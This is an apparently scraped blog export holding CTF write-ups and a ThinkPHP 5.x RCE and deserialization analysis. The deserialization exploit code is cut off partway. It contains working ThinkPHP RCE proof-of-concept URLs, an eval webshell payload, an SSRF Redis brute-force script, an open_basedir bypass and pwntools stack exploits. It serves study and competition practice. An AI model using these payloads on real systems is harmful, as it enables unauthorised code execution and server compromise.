{"meta":{"title":"R1ght0us's Blog","subtitle":"一个Hack小子的梦想","description":"贪财好色，一身正气","author":"R1ght0us","url":"http://www.r1ght0us.xyz"},"pages":[{"title":"categories","date":"2018-08-14T05:48:46.000Z","updated":"2018-08-14T14:19:11.520Z","comments":false,"path":"categories/index.html","permalink":"http://www.r1ght0us.xyz/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-08-14T05:35:13.000Z","updated":"2018-08-14T14:19:01.864Z","comments":false,"path":"tags/index.html","permalink":"http://www.r1ght0us.xyz/tags/index.html","excerpt":"","text":""},{"title":"About R1ght0us","date":"2018-08-15T07:52:10.000Z","updated":"2020-12-28T07:56:14.418Z","comments":false,"path":"about/index.html","permalink":"http://www.r1ght0us.xyz/about/index.html","excerpt":"","text":"被迫跨专业研一菜狗 脚本小子，0动手能力 CTF，面向百度解题的Web混子 Contactecho ZW1haWw6cjFnaHQwdXNAcXEuY29tCg==|base64 -d 人无名，方可潜心练剑"}],"posts":[{"title":"TP诸多限制条件下如何getshell","slug":"TP诸多限制条件下如何getshell","date":"2020-10-30T03:12:54.000Z","updated":"2020-12-28T07:39:21.929Z","comments":true,"path":"2020/10/30/TP诸多限制条件下如何getshell/","link":"","permalink":"http://www.r1ght0us.xyz/2020/10/30/TP诸多限制条件下如何getshell/","excerpt":"2020_n1CTF的web题Easy_tp5复现总结 这个题在保留thinkphp的RCE点的同时，并且RCE中ban掉许多危险函数，只能允许单参数的函数执行。对于现在在网络中流传的文件包含的点也增加了限制。 smile yyds!","text":"2020_n1CTF的web题Easy_tp5复现总结 这个题在保留thinkphp的RCE点的同时，并且RCE中ban掉许多危险函数，只能允许单参数的函数执行。对于现在在网络中流传的文件包含的点也增加了限制。 smile yyds! 本文首发于公众号：酒仙桥六号部队 先说一下这个题限制条件： thinkphp版本：5.0.0 php版本：7 对于包含文件增加了限制 ban掉所有的单参数危险函数 设置open_basedir为web目录 设置仅在public目录下可写 在TP5.0.0的中，目前公布的只是存在利用Request类其中变量被覆盖导致RCE。如果ban掉单参数可利用函数那么只能用文件包含，但是文件包含做了限制不能包含log文件，所以只能从别的方面入手。 这些限制都太大了，所以需要想办法去上传一个shell来完成后续绕disable_function。 首先TP5.0.0目前只存在通过覆盖Request中的某些变量导致RCE，其余细节不再赘述，我们看看大概代码执行点在哪里 call_user_func是代码执行点，我们基本上所有PHP自带的可利用函数基本被ban掉，所以我们需要从自写的函数调用来入手，首先我们需要看下这个点。可回调函数不仅仅指的是简单函数，还可以是一些对象的方法，包括静态方法 预期解（thinkphp\\library\\think\\Build::module）我们可以这样通过调用这个类的静态方法module，来实现写文件的操作 我们先看看这个该怎么走，我们看到这个mkdir是在application创建目录，但是由于权限问题肯定无法创建。根据TP报错即退出的机制从而中断执行。那么我们可以通过../public/test来创建目录 我们会进入到buildhello函数中 走完流程发现我们可以在public创建了一个test模块，同样看到test/controller/Index.php中我们所写的../public/test保存了下来那么我们就绕过，但是执行完之后会发现一些语法错误导致代码不能执行 由于这部分内容可控那我们就把他变得符合语法执行，我们可以这么做test;eval($_POST[a]);#/../../public/test;，这样就符合语法但是还有一个问题需要解决，就是我们这样的payload会设置一个不存在目录从而可以符合语法并且加入eval函数。但是现在还存在一个跨越不存在目录的问题。 linux环境 win环境 在Linux中不能创建不存在的目录，但是在win下就可以。但是报错是warning，并不会中断执行，并且在bindhello函数中我们会看到其中mkdir函数存在recursive参数为true，允许递归创建多级嵌套的目录。这样就可以使mkdir中使用不存在的目录就可以进行绕过。但是现在有个问题：前面的mkdir中的warning报错被TP捕获到直接会退出无法执行后面的内容，那么我们就需要使用一些办法进行抑制报错。我们经常做题会用到一个函数error_reporting，我们可以使用error_reporting(0)抑制报错。 我们再回到代码执行点，我们发现call_user_func函数执行完的值会执行循环再次回到call_user_func()中当回调函数的参数进行使用。因此需要考虑一下怎么调整才能让我们执行并且抑制报错。 如果我们将error_reporting放在前面执行，无论参数是什么都会返回0从而导致后面执行代码不可控。 如果我们将think\\Build::module放前面，那么thinkphp报错也不能执行成功。 但是如果我们放入一个中间值，在第一次执行能够成功创建目录，并且error_reporting还能成功执行，这时候就需要用到PHP弱类型比较，PHP中 0 == null，0 == 非数字开头的字符串 payload如下可示： 非预期解1（使用注释符绕过语法产生的错误）payload如下：这样就会使用注释符注释掉后面的语法错误，然后使用?&gt;包裹住，后面跟上自己用的payload即可。但是这样会产生一个问题，无法在win环境下使用，win下文件夹中不能带这些字符\\ : * ? \" < > | ```123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657## 非预期解2 （文件包含&amp;php伪协议）这种操作就是，我们通过之前的`think\\Build::module`写文件进去，写入的内容是我们rot13编码过的。然后通过`think\\__include_file`调用我们写入文件的内容，因为这个过滤不够完全，可以让我们包含我们所写的内容。![](TP诸多限制条件下如何getshell/19.jpg)![](TP诸多限制条件下如何getshell/20.jpg)## 非预期解3 （覆盖日志路径写入）**因为题目将error_log函数ban掉了，所以这个非预期解是在不ban掉error_log函数的情况下所实现的**payload具体如下：![](TP诸多限制条件下如何getshell/21.png)1. 通过`json_decode`使得我们传入的`&#123;&quot;type&quot;:&quot;File&quot;, &quot;path&quot;:&quot;/var/www/html/null/public/logs&quot;&#125;`转换成内置类stdClass的一个对象2. 再通过`get_object_vars`将其转换成数组传入到`think\\Log::init`中3. 在其中会new了一个`\\think\\log\\driver\\File`，并且传入的参数是我们的`&apos;path&apos;=&gt;/var/www/html/null/public/logs`，那么会触发类中的__construct，将其默认的path给覆盖掉![](TP诸多限制条件下如何getshell/22.jpg)![](TP诸多限制条件下如何getshell/23.jpg)4. 最后因为我们触发漏洞点的特殊性，肯定会报错使得报错信息可以被计入到log文件里![](TP诸多限制条件下如何getshell/24.png)![](TP诸多限制条件下如何getshell/25.png)5. 之后再通过`think\\Lang::load`包含![](TP诸多限制条件下如何getshell/26.png)![](TP诸多限制条件下如何getshell/28.jpg)![](TP诸多限制条件下如何getshell/27.jpg)## 非预期解4 (::竟然可以调用非静态方法)下面是个简单的例子```php&lt;?phpclass A&#123; public function test1($a)&#123; echo &quot;test1&quot;.$a; &#125; static function test2($a)&#123; echo &quot;test2&quot;.$a; &#125; public function test3($a)&#123; $this-&gt;b = $a; echo &quot;test3&quot;.$this-&gt;b; &#125;&#125;call_user_func(&quot;A::test1&quot;,&quot;x&quot;);echo &quot;&lt;/br&gt;&quot;;call_user_func(&quot;A::test2&quot;,&quot;x&quot;);echo &quot;&lt;/br&gt;&quot;;call_user_func(&quot;A::test3&quot;,&quot;x&quot;);echo &quot;&lt;/br&gt;&quot;;//$xxx=new A();//call_user_func(array($xxx,&apos;test3&apos;),&quot;x&quot;); 我们看看会怎么执行会发现使用::调用了public类的方法并且能够成功执行，但是会报错。并且::仅仅适合在方法中没有写$this的情况，因为$this指代的是这个对象，找不到对象自然会报错。那么我们看一下下面的payload就会一眼明白，payload其实用了跟上面预期解抑制错误的另一种方法，然后抑制报错让TP不会遇错停止执行 这个题解的payload如下 因为PHP本身的错误处理被thinkphp所替代进行处理，所以上面就是将thinkphp所替代错误进行处理的方法给覆盖掉导致没有办法正常执行 调用self::path方法，可以抛弃掉我们上一个执行的返回值，并且返回我们所输入的path。为什么会返回path，path为什么是我们输入的值，这个就是之前提到的代码执行点他是覆盖了Request类的参数，所以方法返回的是$this-&gt;path，这个我们可以控制。 之后调用base64_decode，返回值就是我们base64解码的内容 解码后的返回值就会进入\\think\\view\\driver\\Php::Display中，然后进入eval执行代码","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://www.r1ght0us.xyz/categories/代码审计/"}],"tags":[{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://www.r1ght0us.xyz/tags/ThinkPHP/"},{"name":"PHP","slug":"PHP","permalink":"http://www.r1ght0us.xyz/tags/PHP/"},{"name":"比赛复现","slug":"比赛复现","permalink":"http://www.r1ght0us.xyz/tags/比赛复现/"}]},{"title":"2020天山固网杯wp","slug":"2020天山固网杯wp","date":"2020-09-16T15:41:14.000Z","updated":"2020-09-16T15:53:18.022Z","comments":true,"path":"2020/09/16/2020天山固网杯wp/","link":"","permalink":"http://www.r1ght0us.xyz/2020/09/16/2020天山固网杯wp/","excerpt":"web题恶心的离谱，但也是自己功夫不到家。期待官方wp","text":"web题恶心的离谱，但也是自己功夫不到家。期待官方wp webez_ssrf打开发现代码存在SSRF。那么扫描端口http://183.129.189.61:50400/index.php?url=dict://127.0.0.1:6379/info发现redis存在，并且存在一个redis认证。简单爆破一下看看是否存在弱密码 12345678910111213141516171819import hackhttphh = hackhttp.hackhttp()url = \"http://183.129.189.61:50400/index.php?url=\"f=open(\"payload.txt\",\"r\")while 1: line=f.readline() line=line.strip(\"\\n\") if not line: break #print line length=len(line) payload=\"gopher://127.0.0.1:6379/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524\"+str(length)+\"%250d%250a\"+line+\"%250D%250A%252A1%250D%250A\" code, head, body, redirect, log = hh.http(url+payload) if \"OK\"in body: print payload print \"mima is \"+line break 发现弱密码是123456，并且发现存在一个upload目录，那么我们构造数据包最终为12345678910111213141516171819此处是将file首先编码一次然后再二次编码所得，绕过index.php存在的过滤因此在这里访问：test.php看到phpinfo中存在disable_function和open_basedir简单的看了看disable_function中过滤并不完整readfile没有被过滤并且open_basedir可以使用open_baedir绕过脚本```phpmkdir(&apos;tmpdir&apos;);chdir(&apos;tmpdir&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);$a=readfile(&apos;/flag&apos;);var_dump($a); 发现flag repyreversehttps://www.cnblogs.com/0x4D75/p/11161797.html采用这篇blog的第二个方法但本题不需要去签名，直接成功得到文件夹然后将struct中的头部结构添加到pyreverse文件中修改后缀反编译即可贴出解题脚本12345str = \"[^L\\\\KYd'),&#123;&#123;&amp;&#125;/*&#125;.&#125;'&#125;y-/(-)&#123;|.*&amp;&amp;*~z|-'b\"flag = ''for i in str: flag = flag + chr(ord(i) ^ 31)Print(flag) pwnddstack打开IDA分析文件 可以看到有两次写入，第一次写入大小为0x30，第二次写入为大小为nbytes，写入的地址都是&amp;buf， 进入&amp;buf查看栈布局 发现buf到栈底的大小为0x34（大于大二次写入时nbytes要求的0x30），nbytes的位置距离栈底为0xc，而第一次写入字符的上限是0x30大于（0x34-0xc），由此发现漏洞：可以第一次写入时可以更改nbytes的大小，从而使第二次写入任意长度的字符串造成栈溢出，从而实现劫持程序执行流。Exp如下：1234567891011121314151617181920212223242526272829303132333435from pwn import *context.binary = \"./ddstack\"ddstack = context.binaryp = remote('183.129.189.61', 52205)libc = ELF('./libc-2.23.so')puts_plt = ddstack.plt['puts']puts_got = ddstack.got['puts']pop1_ret = 0x804837dvuln_addr = 0x8048520p.recvuntil(b'\\n')p.sendline(b'\\x00'*0x28+p32(0x500))payload = b'\\x00'*0x38+p32(puts_plt)+ p32(pop1_ret) + p32(puts_got) +p32(vuln_addr)p.recvuntil(b'\\n')p.sendline(payload)puts_libc_addr = u32(p.recv(4))print('puts addr:'+hex(puts_libc_addr))puts_libc_offset = libc.symbols['puts']print(hex(puts_libc_offset))libc_addr = puts_libc_addr - puts_libc_offsetprint('lib base:'+hex(libc_addr))ogg_addr = libc_addr + 0x3a81csystem_addr = libc_addr+libc.symbols['system']binsh_addr = libc_addr + 0x0015910bp.recvuntil(b'\\n')p.sendline(b'\\x00'*0x28+p32(0x500))payload = b'\\x00'*0x38+p32(system_addr)+ p32(pop1_ret) + p32(binsh_addr) +p32(vuln_addr)p.recvuntil(b'\\n')p.sendline(payload)p.interactive() pwnxzd一上来就看到了vuln_func，点开一看，只是一个有溢出漏洞的函数，并且没有函数调用就很奇怪看到主函数中有一个使用指针调用函数的地方，只要修改addr指向vuln_func函数就能触发漏洞。输入：‘’’-6 6000004 1345138511 123456‘’’执行到vuln_func函数：有栈溢出但是没有输出函数可用，那就指定是ret2_dl_runtime_resolve：先调用read函数用于再bss段上输入下一个paylaod，再用栈迁移将栈移到bss段中：rop.raw(‘a’ offset)rop.read(0, base_stage, 100)rop.migrate(base_stage)再继续伪造符号表项：fake_sym_addr = base_stage + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym)st_name = fake_sym_addr + 0x10 - dynstr //st_name指向符号表对应字符串相对于字符串表的索引fake_write_sym = flat([st_name, 0, 0, 0x19])和重定位项：index_offset = base_stage + 24 - rel_pltfake_got = pwn4.got[‘__isoc99_scanf’]r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([fake_got, r_info])伪造栈中内容：rop.raw(plt0)rop.raw(index_offset)rop.raw(‘bbbb’)rop.raw(base_stage + 82)rop.raw(‘bbbb’)rop.raw(‘bbbb’)rop.raw(fake_write_reloc)rop.raw(‘a’ align) # paddingrop.raw(fake_write_sym)rop.raw(‘system\\x00’)rop.raw(‘a’ (80 - len(rop.chain())))rop.raw(sh + ‘\\x00’)rop.raw(‘a’ (100 - len(rop.chain())))EXP：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import *context.binary = \"./pwn4\"pwn4 = context.binaryrop = ROP('./pwn4') vuln_addr = 134513851p.sendline(b'-5 65535')p.sendline(b'4 134513851')p.sendline(b'1 123456') offset = 28bss_addr = pwn4.bss() stack_size = 0x800base_stage = bss_addr + stack_sizerop.raw('a' * offset)rop.read(0, base_stage, 100)rop.migrate(base_stage)p.sendline(rop.chain()) rop = ROP('./pwn4')sh = \"/bin/sh\" plt0 = pwn4.get_section_by_name('.plt').header.sh_addrrel_plt = pwn4.get_section_by_name('.rel.plt').header.sh_addrdynsym = pwn4.get_section_by_name('.dynsym').header.sh_addrdynstr = pwn4.get_section_by_name('.dynstr').header.sh_addr fake_sym_addr = base_stage + 32align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # since the size of item(Elf32_Symbol) of dynsym is 0x10fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) // 0x10 # calculate the dynsym index of writest_name = fake_sym_addr + 0x10 - dynstrfake_write_sym = flat([st_name, 0, 0, 0x19]) index_offset = base_stage + 24 - rel_pltfake_got = pwn4.got['__isoc99_scanf']r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_write_reloc = flat([fake_got, r_info]) rop.raw(plt0)rop.raw(index_offset)rop.raw('bbbb')rop.raw(base_stage + 82)rop.raw('bbbb')rop.raw('bbbb')rop.raw(fake_write_reloc)rop.raw('a' * align) rop.raw(fake_write_sym)rop.raw('system\\x00')rop.raw('a' * (80 - len(rop.chain())))rop.raw(sh + '\\x00')rop.raw('a' * (100 - len(rop.chain())))print(rop.chain())p.sendline(rop.chain())p.interactive() CRYPTOmore_and_more用nc链接后观察后联想到e与phi_n不互素，构造出e和phi(n)互素的情况,求出e2和phi_n 的逆元作为dd求出m2，对m2进行开方即可得到flag 1234567891011121314import libnumimport gmpy2n = [175244107616547332866730750185981814617957387479206131883327619678143859414917261557090068672641419524614082746718149196623832474591257254688029368786873659380810545544100093732206528310797663780323115004084293607571875376201003925886997130958845085335102862834229352381711568684829807273446043286026429784507]c = [21584853678639373844706372673402978302367491374400753174448826706430954893731606437969950845160175905352220952818580141736392378203099462357081187525146295619472153677345050680091134337322577619625346776539480539709599567808902655164874470864640210333208364478253093461945151332942720768877894297441396061122]e = 98phi_n = n[0] - 1print(gmpy2.gcd(e,phi_n0))e_2 = e // 2print(gmpy2.gcd(e_2,phi_n))dd = gmpy2.invert(e_2,phi_n)m2 = pow(c[0],dd,n[0])m = gmpy2.iroot(m2,2)print(m[0])print(long_to_bytes(m[0])) MISCEasyPy打开文件，发现是个字节码文件 手撕字节码尝试复原所表达的大概为：123456def a(): flag = 'r1ght0us' flag = flag.upper() flag = flag[::-1] for i in range(len(flag)): print(chr((ord(flag[i])+i)^(len(flag)-i))) 那么我们写出逆向的脚本来 1234567flag = '[cgjegl_&amp;]!VW&amp;KS_GVXHWI_EVCVDXGc^mgrj' #res res = '' for i in range(len(flag)): test = ord(flag[i])^(len(flag)-i) res += chr(test-i) print(res) print(res[::-1].lower()) BaseBase打开压缩包发现： 根据文件大小并且CRC校验我们可以爆破一下 密码为：this_is_pass_word_然后解压打开flag.docx 发现一个字符串：OG5DRHEzNnNsU0g0RHljVlFvOVhoUjRhRjN1M3g4UGtQOGdrYjVydzVIdHBVZjNqSTJ0Mw==先base64 再base62即可 寻找上古之森的秘密先使用steghide爆破出jpg里隐藏的信息然后使用脚本爆破，发现密码为123456abc 然后使用脚本获取到secret.wav密码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#!/usr/bin/env python3'''deepsound2john extracts password hashes from audio files containing encrypteddata steganographically embedded by DeepSound (http://jpinsoft.net/deepsound/).This method is known to work with files created by DeepSound 2.0.Input files should be in .wav format. Hashes can be recovered from audio fileseven after conversion from other formats, e.g., ffmpeg -i input output.wavUsage: python3 deepsound2john.py carrier.wav &gt; hashes.txt john hashes.txtThis software is copyright (c) 2018 Ryan Govostes &lt;rgovostes@gmail.com&gt;, andit is hereby released to the general public under the following terms:Redistribution and use in source and binary forms, with or withoutmodification, are permitted.'''import loggingimport osimport sysimport textwrapdef decode_data_low(buf): return buf[::2]def decode_data_normal(buf): out = bytearray() for i in range(0, len(buf), 4): out.append((buf[i] &amp; 15) &lt;&lt; 4 | (buf[i + 2] &amp; 15)) return outdef decode_data_high(buf): out = bytearray() for i in range(0, len(buf), 8): out.append((buf[i] &amp; 3) &lt;&lt; 6 | (buf[i + 2] &amp; 3) &lt;&lt; 4 \\ | (buf[i + 4] &amp; 3) &lt;&lt; 2 | (buf[i + 6] &amp; 3)) return outdef is_magic(buf): # This is a more efficient way of testing for the `DSCF` magic header without # decoding the whole buffer return (buf[0] &amp; 15) == (68 &gt;&gt; 4) and (buf[2] &amp; 15) == (68 &amp; 15) \\ and (buf[4] &amp; 15) == (83 &gt;&gt; 4) and (buf[6] &amp; 15) == (83 &amp; 15) \\ and (buf[8] &amp; 15) == (67 &gt;&gt; 4) and (buf[10] &amp; 15) == (67 &amp; 15) \\ and (buf[12] &amp; 15) == (70 &gt;&gt; 4) and (buf[14] &amp; 15) == (70 &amp; 15)def is_wave(buf): return buf[0:4] == b'RIFF' and buf[8:12] == b'WAVE'def process_deepsound_file(f): bname = os.path.basename(f.name) logger = logging.getLogger(bname) # Check if it's a .wav file buf = f.read(12) if not is_wave(buf): global convert_warn logger.error('file not in .wav format') convert_warn = True return f.seek(0, os.SEEK_SET) # Scan for the marker... hdrsz = 104 hdr = None while True: off = f.tell() buf = f.read(hdrsz) if len(buf) &lt; hdrsz: break if is_magic(buf): hdr = decode_data_normal(buf) logger.info('found DeepSound header at offset %i', off) break f.seek(-hdrsz + 1, os.SEEK_CUR) if hdr is None: logger.warn('does not appear to be a DeepSound file') return # Check some header fields mode = hdr[4] encrypted = hdr[5] modes = &#123;2: 'low', 4: 'normal', 8: 'high'&#125; if mode in modes: logger.info('data is encoded in %s-quality mode', modes[mode]) else: logger.error('unexpected data encoding mode %i', modes[mode]) return if encrypted == 0: logger.warn('file is not encrypted') return elif encrypted != 1: logger.error('unexpected encryption flag %i', encrypted) return sha1 = hdr[6:6+20] print('%s:$dynamic_1529$%s' % (bname, sha1.hex()))if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('--verbose', '-v', action='store_true') parser.add_argument('files', nargs='+', metavar='file', type=argparse.FileType('rb', bufsize=4096)) args = parser.parse_args() if args.verbose: logging.basicConfig(level=logging.INFO) else: logging.basicConfig(level=logging.WARN) convert_warn = False for f in args.files: process_deepsound_file(f) if convert_warn: print(textwrap.dedent(''' --------------------------------------------------------------- Some files were not in .wav format. Try converting them to .wav and try again. You can use: ffmpeg -i input output.wav --------------------------------------------------------------- '''.rstrip()), file=sys.stderr) 然后再用john跑一下获得的密码最终发现deepsound的密码是qwertyuiop 发现flag尝试导出，并且在目录中发现了压缩包密码：&amp;sf8823*/@flag多次base64之后，发现是一串AES字符串U2FsdGVkX18y3W4CGIjoHFDovK2bPWbYmsGuXnWGVmdVrpWZkT+m+qDWgel6KAEf%0AQRJk7f6EVzt5FGWMexokBA%3D%3D 最后根据精灵语解码发现最后的KEY是：KEYISHERE然后AES解密得到flag","categories":[],"tags":[{"name":"比赛wp","slug":"比赛wp","permalink":"http://www.r1ght0us.xyz/tags/比赛wp/"}]},{"title":"Thinkphp5.x_RCE复现","slug":"Thinkphp5-x-RCE复现","date":"2020-07-21T05:48:00.000Z","updated":"2020-08-07T07:56:53.317Z","comments":true,"path":"2020/07/21/Thinkphp5-x-RCE复现/","link":"","permalink":"http://www.r1ght0us.xyz/2020/07/21/Thinkphp5-x-RCE复现/","excerpt":"TP5.x两个类型的RCE总结&amp;5.0.24反序列化","text":"TP5.x两个类型的RCE总结&amp;5.0.24反序列化 环境部署以TP5.0.22为例 + PHP 5.6.27-NTS + phpstorm2020.1 反序列化环境为:TP5.0.24 + PHP 5.6.27-NTS + phpstorm2020.1 漏洞成因现在TP的RCE通常将其分成两类： Request类其中变量被覆盖导致RCE 路由控制不严谨导致可以调用任意类致使RCE 反序列化的应用（需要存在反序列化的地方） Request类其中变量被覆盖导致RCE我们以这个POC为例，进行复现： 我们正常的代码逻辑已经简单的写在了前文，如有代码执行疑惑请在前文寻找答案。 下面我们进行漏洞跟踪梳理 App:run()进行启动，进行到URL路由检测self::routeCheck($request, $config) $request-&gt;path()获取到我们自带的兼容模式参数s 进入路由检测Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]) 关键代码$method = strtolower($request-&gt;method())进入$request-&gt;method()看到在查找$_POST中是否有表单请求类型伪装变量（简单解释一下这个，就是form表单的method只能进行GET和POST请求，如果想进行别的请求例如put、delete可以使用这个伪装变量来进入到相应的路由进行处理） 一个PHP经典可变函数进行相关的调用$this-&gt;{$this-&gt;method}($_POST)，根据POC我们就进入到了 __construct ，这个东西是PHP魔术方法，进入到里面之后就可以将原先的数据覆盖成我们POST上去的数据，最后返回的是POST上去的method=get 最终返回数据如下图所示并且赋值给$dispatch 进入关键代码$data = self::exec($dispatch, $config) 然后再次进入到回调方法中的Request::instance()-&gt;param()，继续跟踪到array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter)，这个函数解释如下： 重要代码跟进，调用call_user_func($filter, $value)将其传入的$filter=system,$value=sysyteminfo 最后返回的需要进行一次过滤，不过大致查看能发现过滤字符基本为SQL注入的过滤，不是RCE的类型 现在再次回到call_user_func($filter, $value)因为最终你传入的是一个数组，第一个是需要执行的类型，后面是为null，因此会报错。 最终进入到\\thinkphp\\library\\think\\exception\\Handle.php的174行，$data[&#39;echo&#39;] = ob_get_clean()，获取到前面未被赋值的命令执行的结果，从而随着报错页面一起发送给客户端从而达到回显的目的。 POC版本测试 需要captcha的method路由，如果存在其他method路由，也是可以将captcha换为其他1234565.0~5.0.23(本人只测了0和23的完整版，那么猜测中间的版本也是通杀没有问题)POST http://localhost/tp/public/index.php?s=captcha?s=captcha_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami5.1.x低版本也可行请自行调试寻找 需要解释一些问题这里简单提一下，我在复盘TP漏洞时看到先知社区一些疑问，已经在讨论区里发表了我的意见。这篇文章的讨论区，由于TP本身自带错误中断的机制，因此assert不会正常执行。 路由控制不严谨导致可以调用任意类致使RCE我们以这个POC为例http://localhost/tp/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()) 正常代码逻辑已经梳理，请自行查看前文。下面进行漏洞逻辑梳理 进入路由$dispatch = self::routeCheck($request, $config)，最终进入Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;])，通过分隔符替换从而将我们输入的pathinfo信息打散成数组： index|think\\app|invokefunction，最终返回类似这样的数据 进入$data = self::exec($dispatch, $config);将前面获得的调度信息传进去 进入$data = self::module($dispatch[&#39;module&#39;],$config,isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null); 一直跟踪到往下看，这句代码就是为什么我们要在pathinfo中首先要写 index ：elseif (!in_array($module, $config[&#39;deny_module_list&#39;]) &amp;&amp; is_dir(APP_PATH . $module))。这样能保证程序不报错中断并且使 $available=true 分别将模块、控制器、操作将其赋值为我们所输入的 index think\\app invokefunction 进入Loader::controller进行控制类调用 Loader::getModuleAndClass 使得程序通过 invokeClass 返回我们所输入的类的实例 进入到App::invokeMethod，反射出我们所输入的类的方法信息(ReflectionMethod)，绑定我们输入的参数，进入$reflect-&gt;invokeArgs(isset($class) ? $class : null, $args)那么就可以调用我们所想调用的函数，参数也相应传入 最后跟前面那个漏洞一样，我们所执行的结果会随着报错输出缓冲区一起显示出来。 POC版本测试因为linux和win的环境不一样导致代码逻辑判断不一样因此需要自行寻找123455.0.x(具体自行测试)http://localhost/tp/public/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()5.1.x(具体自行测试，适合linux环境)http://127.0.0.1/index.php?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1 TP5.0.24反序列化利用链先看看PHP的魔术方法梳理反序列化利用链漏洞首先需要一个漏洞触发点，别问，问就是自己写：我们发现在 thinkphp/library/think/process/pipes/Windows.php 中发现__destruct中存在removeFiles函数，并且在其中存在$this-&gt;files和file_exists，那么我们通过可控的$this-&gt;files利用file_exists可以调用一些类的__toString方法，之后查看此方法在抽象类Model（thinkphp/library/think/Model.php），抽象类不能直接调用，因此需要找他的子类。我们可以找到Pivot（thinkphp/library/think/model/Pivot.php）进行调用然后从toJson()-&gt;toArray()，我们看到$item[$key] = $value ? $value-&gt;getAttr($attr) : null其中 $value-&gt;getAttr是我们利用__call魔术方法 的点，我们来梳理代码逻辑使之可以顺利执行这句代码。 $this-&gt;append可以控制，将其变成Model类的getError方法，然后跟进看到此方法存在$this-&gt;error，因此可以控制$this-&gt;$relation() 进入到 getRelationData 进行一次判断，首先需要进入的是Relation类型的对象，并且要符合这个关键判断$this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent) 才能让$value变成我们想要的东西 首先传入的Relation对象是由$this-&gt;$relation()控制，我们可以找到HasOne（thinkphp/library/think/model/relation/HasOne.php）这个类是继承抽象类OneToOne（thinkphp/library/think/model/relation/OnToOne.php），然后OneToOne又继承自Relation，所以HasOne有着Relation的血脉才能进入getRelationData方法 $this-&gt;parent 是我们所要进入的__call魔术方法所在的类，这里我们选择的是Output类（thinkphp/library/think/console/Output） $modelRelation-&gt;isSelfRelation() 看到$this-&gt;selfRelation，我们可以控制。 get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))，我们需要将最后Query的$this-&gt;model写成我们选择的Output类 最后$this-&gt;parent赋值给$value，执行代码之后进入到Output类的__call方法 进入到__call，发现$this-&gt;styles我们可以控制那么就可以执行block方法，block调用writeln方法，writeln调用write方法，发现write方法中$this-&gt;handle-&gt;write($messages, $newline, $type)那么我们可以控制$this-&gt;handle，我们将其设置为Memcached类（thinkphp/library/think/session/driver/Mencached.php），然后进入到Memcached-&gt;write方法中看到Memcached也存在一个$this-&gt;handle，我们将其设置为File类（thinkphp/library/think/cache/driver/File.php）从而进入到File-&gt;set方法我们可以看到file_put_contents($filename, $data)其中的两个参数我们都可以控制 首先传入的三个参数已经确定，其中$name，$expire我们可以控制，但是有用的就是$name 发现写入的数据就是我们无法控制的$value，无法利用。我们不慌继续往下看，看到有一个$this-&gt;setTagItem($filename)我们看到此方法又调用一次set方法并且传入set的三个值我们都可以控制 再一次进入set方法， 通过php伪协议可以绕过exit()的限制 ，就可以将危害代码写在服务器上了。 EXP从网上找来的EXP，改了改关键的几个点，并且可以实现在Windows写文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; //$file =&gt; /think/Model的子类new Pivot(); Model是抽象类 &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; //$this-&gt;parent=&gt; think\\console\\Output; $this-&gt;append = array(\"xxx\"=&gt;\"getError\"); //调用getError 返回this-&gt;error $this-&gt;error = $modelRelation; // $this-&gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==&gt;&gt;HasOne &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$query指向Query $this-&gt;bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量 &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function 